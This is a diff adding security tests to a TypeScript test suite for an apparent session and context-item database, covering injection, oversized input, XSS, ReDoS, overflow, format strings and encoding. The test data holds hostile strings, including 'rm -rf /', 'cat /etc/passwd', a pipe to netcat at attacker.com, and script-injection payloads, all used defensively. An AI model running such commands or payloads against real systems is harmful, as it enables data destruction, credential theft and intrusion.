@@ -212,5 +212,306 @@ describe('Security - Input Validation Tests', () => {
         expect(input).toMatch(/[;&|`$]/); // Contains shell metacharacters
       });
     });
+
+    it('should prevent injection in session names', () => {
+      const maliciousSessionNames = [
+        'session; rm -rf /',
+        'session && cat /etc/passwd',
+        'session`malicious`',
+        'session$(evil)',
+        'session | nc attacker.com 1234',
+      ];
+
+      maliciousSessionNames.forEach(name => {
+        // Session names should be validated
+        expect(() => {
+          if (/[;&|`$()]/.test(name)) {
+            throw new Error('Invalid characters in session name');
+          }
+        }).toThrow('Invalid characters in session name');
+      });
+    });
+  });
+
+  describe('Buffer Overflow Prevention', () => {
+    it('should prevent stack overflow from deeply nested JSON', () => {
+      // Create deeply nested object that could cause stack overflow
+      let deeplyNested: any = {};
+      let current: any = deeplyNested;
+      
+      for (let i = 0; i < 10000; i++) {
+        current.nested = {};
+        current = current.nested;
+      }
+      
+      const jsonString = JSON.stringify(deeplyNested);
+      
+      expect(() => {
+        validateValue(jsonString);
+      }).toThrow(/Value is too large/);
+    });
+
+    it('should prevent excessive memory allocation', () => {
+      // Attempt to create a string that would use excessive memory
+      const size = 10 * 1024 * 1024; // 10MB
+      
+      expect(() => {
+        const largeString = 'x'.repeat(size);
+        validateValue(largeString);
+      }).toThrow(/Value is too large/);
+    });
+
+    it('should handle array overflow attempts', () => {
+      // Create array with many elements
+      const largeArray = new Array(1000000).fill('item');
+      const arrayJson = JSON.stringify(largeArray);
+      
+      expect(() => {
+        validateValue(arrayJson);
+      }).toThrow(/Value is too large/);
+    });
+  });
+
+  describe('Cross-Site Scripting (XSS) Prevention', () => {
+    it('should handle HTML and JavaScript in values', () => {
+      const db = dbManager.getDatabase();
+      const sessionId = 'test-session';
+      
+      // Create session
+      db.prepare('INSERT INTO sessions (id, name) VALUES (?, ?)').run(sessionId, 'Test');
+      
+      const xssAttempts = [
+        '<script>alert("XSS")</script>',
+        '<img src="x" onerror="alert(1)">',
+        'javascript:alert("XSS")',
+        '<svg onload="alert(1)">',
+        '"><script>alert("XSS")</script>',
+      ];
+
+      xssAttempts.forEach((xss, index) => {
+        // Should store as-is (escaping should happen on output, not input)
+        db.prepare(`
+          INSERT INTO context_items (id, session_id, key, value, category, priority)
+          VALUES (?, ?, ?, ?, ?, ?)
+        `).run(`xss-${index}`, sessionId, `key-${index}`, xss, 'test', 'normal');
+        
+        // Verify it was stored correctly
+        const item = db.prepare('SELECT value FROM context_items WHERE id = ?').get(`xss-${index}`) as any;
+        expect(item.value).toBe(xss);
+      });
+    });
+  });
+
+  describe('Regular Expression Denial of Service (ReDoS) Prevention', () => {
+    it('should handle catastrophic backtracking patterns', () => {
+      const maliciousPatterns = [
+        '(a+)+b',
+        '(a|a)*b',
+        '(a|b)*a*b',
+        '([a-zA-Z]+)*b',
+        '(x+x+)+y',
+      ];
+
+      const attackString = 'a'.repeat(100); // String that could cause exponential backtracking
+
+      maliciousPatterns.forEach(pattern => {
+        const start = Date.now();
+        
+        // Simulate regex validation that might be vulnerable
+        try {
+          const regex = new RegExp(pattern);
+          const result = regex.test(attackString);
+          const elapsed = Date.now() - start;
+          
+          // Should complete quickly (under 100ms)
+          expect(elapsed).toBeLessThan(100);
+        } catch (error) {
+          // Pattern might be invalid, which is also fine
+          expect(error).toBeDefined();
+        }
+      });
+    });
+  });
+
+  describe('Integer Overflow Prevention', () => {
+    it('should handle maximum integer values', () => {
+      const db = dbManager.getDatabase();
+      const sessionId = 'test-session';
+      
+      // Create session
+      db.prepare('INSERT INTO sessions (id, name) VALUES (?, ?)').run(sessionId, 'Test');
+      
+      const maxValues = [
+        Number.MAX_SAFE_INTEGER.toString(),
+        Number.MIN_SAFE_INTEGER.toString(),
+        '9007199254740991', // Max safe integer
+        '-9007199254740991', // Min safe integer
+      ];
+
+      maxValues.forEach((value, index) => {
+        expect(() => {
+          db.prepare(`
+            INSERT INTO context_items (id, session_id, key, value, category, priority)
+            VALUES (?, ?, ?, ?, ?, ?)
+          `).run(`int-${index}`, sessionId, `key-${index}`, value, 'test', 'normal');
+        }).not.toThrow();
+      });
+    });
+
+    it('should handle beyond max integer attempts', () => {
+      const overflowValues = [
+        '99999999999999999999999999999',
+        '-99999999999999999999999999999',
+        'Infinity',
+        '-Infinity',
+        'NaN',
+      ];
+
+      overflowValues.forEach(value => {
+        // Should be stored as strings, not cause overflow
+        expect(() => {
+          validateValue(value);
+        }).not.toThrow();
+      });
+    });
+  });
+
+  describe('Format String Attack Prevention', () => {
+    it('should handle format string specifiers safely', () => {
+      const db = dbManager.getDatabase();
+      const sessionId = 'test-session';
+      
+      // Create session
+      db.prepare('INSERT INTO sessions (id, name) VALUES (?, ?)').run(sessionId, 'Test');
+      
+      const formatStrings = [
+        '%s%s%s%s%s%s%s%s',
+        '%x%x%x%x%x%x%x%x',
+        '%n%n%n%n%n%n%n%n',
+        '%08x.%08x.%08x.%08x',
+        '%%n%%n%%n%%n%%n',
+      ];
+
+      formatStrings.forEach((format, index) => {
+        // Should store as regular strings
+        db.prepare(`
+          INSERT INTO context_items (id, session_id, key, value, category, priority)
+          VALUES (?, ?, ?, ?, ?, ?)
+        `).run(`fmt-${index}`, sessionId, `key-${index}`, format, 'test', 'normal');
+        
+        const item = db.prepare('SELECT value FROM context_items WHERE id = ?').get(`fmt-${index}`) as any;
+        expect(item.value).toBe(format);
+      });
+    });
+  });
+
+  describe('Resource Exhaustion Prevention', () => {
+    it('should prevent excessive database queries', async () => {
+      const db = dbManager.getDatabase();
+      const sessionId = 'test-session';
+      
+      // Create session
+      db.prepare('INSERT INTO sessions (id, name) VALUES (?, ?)').run(sessionId, 'Test');
+      
+      // Add many items quickly
+      const start = Date.now();
+      
+      for (let i = 0; i < 1000; i++) {
+        db.prepare(`
+          INSERT INTO context_items (id, session_id, key, value, category, priority)
+          VALUES (?, ?, ?, ?, ?, ?)
+        `).run(`bulk-${i}`, sessionId, `key-${i}`, `value-${i}`, 'test', 'normal');
+      }
+      
+      const elapsed = Date.now() - start;
+      
+      // Should complete within reasonable time (under 5 seconds)
+      expect(elapsed).toBeLessThan(5000);
+      
+      // Verify count
+      const count = db.prepare('SELECT COUNT(*) as count FROM context_items WHERE session_id = ?').get(sessionId) as any;
+      expect(count.count).toBe(1000);
+    });
+
+    it('should handle concurrent access without deadlocks', async () => {
+      const db = dbManager.getDatabase();
+      const sessionId = 'test-session';
+      
+      // Create session
+      db.prepare('INSERT INTO sessions (id, name) VALUES (?, ?)').run(sessionId, 'Test');
+      
+      const promises: Promise<void>[] = [];
+      
+      // Create 100 concurrent operations
+      for (let i = 0; i < 100; i++) {
+        promises.push(
+          Promise.resolve().then(() => {
+            db.prepare(`
+              INSERT INTO context_items (id, session_id, key, value, category, priority)
+              VALUES (?, ?, ?, ?, ?, ?)
+            `).run(`concurrent-${i}`, sessionId, `key-${i}`, `value-${i}`, 'test', 'normal');
+          })
+        );
+      }
+      
+      const start = Date.now();
+      await Promise.all(promises);
+      const elapsed = Date.now() - start;
+      
+      // Should complete without deadlocks (under 2 seconds)
+      expect(elapsed).toBeLessThan(2000);
+      
+      // Verify all items were inserted
+      const count = db.prepare('SELECT COUNT(*) as count FROM context_items WHERE session_id = ?').get(sessionId) as any;
+      expect(count.count).toBe(100);
+    });
+  });
+
+  describe('Encoding and Charset Attacks', () => {
+    it('should handle different character encodings', () => {
+      const db = dbManager.getDatabase();
+      const sessionId = 'test-session';
+      
+      // Create session
+      db.prepare('INSERT INTO sessions (id, name) VALUES (?, ?)').run(sessionId, 'Test');
+      
+      const encodingTests = [
+        'Normal ASCII text',
+        'UTF-8: 你好世界 🌍',
+        'Latin-1: café naïve résumé',
+        'Mixed: Hello世界🌍café',
+        Buffer.from('Binary data', 'utf8').toString('base64'),
+      ];
+
+      encodingTests.forEach((text, index) => {
+        db.prepare(`
+          INSERT INTO context_items (id, session_id, key, value, category, priority)
+          VALUES (?, ?, ?, ?, ?, ?)
+        `).run(`enc-${index}`, sessionId, `key-${index}`, text, 'test', 'normal');
+        
+        const item = db.prepare('SELECT value FROM context_items WHERE id = ?').get(`enc-${index}`) as any;
+        expect(item.value).toBe(text);
+      });
+    });
+
+    it('should handle invalid UTF-8 sequences', () => {
+      const db = dbManager.getDatabase();
+      const sessionId = 'test-session';
+      
+      // Create session
+      db.prepare('INSERT INTO sessions (id, name) VALUES (?, ?)').run(sessionId, 'Test');
+      
+      // Create buffer with invalid UTF-8
+      const invalidUtf8 = Buffer.from([0xFF, 0xFE, 0xFD, 0xFC]);
+      const invalidString = invalidUtf8.toString('utf8'); // This may produce replacement characters
+      
+      db.prepare(`
+        INSERT INTO context_items (id, session_id, key, value, category, priority)
+        VALUES (?, ?, ?, ?, ?, ?)
+      `).run('invalid-utf8', sessionId, 'invalid-key', invalidString, 'test', 'normal');
+      
+      const item = db.prepare('SELECT value FROM context_items WHERE id = ?').get('invalid-utf8') as any;
+      expect(item.value).toBeDefined(); // Should store something, even if replaced chars
+    });
   });
 });
